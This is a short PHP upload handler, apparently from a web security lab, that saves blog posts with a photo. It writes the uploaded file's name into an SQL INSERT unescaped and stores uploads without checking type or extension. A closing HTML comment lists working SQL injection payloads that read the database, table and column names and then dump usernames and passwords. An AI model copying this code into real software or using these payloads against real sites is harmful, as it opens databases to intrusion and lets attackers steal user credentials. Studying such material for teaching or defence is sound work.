<?php
  require('koneksi.php');
  $judul = mysqli_real_escape_string($conn,$_POST['judul']);
  $konten = mysqli_real_escape_string($conn,$_POST['konten']);
  $nim = mysqli_real_escape_string($conn,$_POST['nim']);
  $nama = $_FILES['foto']['name'];
  $folder = './foto/';
  $sumber = $_FILES['foto']['tmp_name'];
  move_uploaded_file($sumber, $folder.$nama);

$sql = "INSERT INTO post (judul, konten, nim, nama_gambar) VALUES ('$judul', '$konten', '$nim', '$nama')";

if ($conn->query($sql) === TRUE) {
  header("Location:isi_konten_secure.php?anggota_ditambahkan=1");
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>
<!-- //cari nama database
// Judul1', database(), '1') --  

// cari nama tabel
// tabel', (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'blog'), '4') -- 

// cari nama kolom
// kolom', (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'blog' AND table_name = 'user'), '5') -- 

// cari data username dari nama kolom user
// data username', (SELECT group_concat(username) FROM user), '3') -- 
// data password', (SELECT group_concat(password) FROM user), '4') -- 
 -->